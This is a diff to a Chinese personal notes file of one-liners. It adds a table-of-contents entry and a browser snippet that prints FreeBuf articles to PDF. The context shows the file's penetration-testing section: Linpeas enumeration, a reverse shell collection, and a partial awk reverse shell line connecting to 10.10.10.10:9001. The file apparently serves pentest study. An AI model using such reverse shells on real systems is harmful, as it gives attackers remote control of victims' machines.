@@ -22,11 +22,13 @@ instruction
 --- <!-- 当前liner的 分割线 也是尾部 -->
 ````
 ## 目录
- * [Rust](#rust)
-   * [Linux安装Rust环境](#linux安装rust环境)
- * [渗透测试](#渗透测试)
-   * [Linpeas.sh枚举提权信息](#linpeassh枚举提权信息)
-   * [反弹shell合集](#反弹shell合集)
+* [Rust](#rust)
+  * [Linux安装Rust环境](#linux安装rust环境)
+* [渗透测试](#渗透测试)
+  * [Linpeas.sh枚举提权信息](#linpeassh枚举提权信息)
+  * [反弹shell合集](#反弹shell合集)
+* [xxx2pdf](#xxx2pdf)
+  * [freebuf2pdf](#freebuf2pdf)
 
 <!-- 列表头 -->
 ## Rust
@@ -89,4 +91,11 @@ awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/9001"; while(42) { do{ printf "shell>" 
 ```
 --- 
 
+### xxx2pdf
+### freebuf2pdf
+> ***2024-6-28: fb0sh***
+```js
+["articles-layout-header ant-layout-header", "page-header", "ant-layout-footer","floating-view", "aside-left", "aside-right", "remix-module","introduce"].forEach(c => document.getElementsByClassName(c)[0].remove());window.print();
+```
+---
 <!-- 列表尾 -->
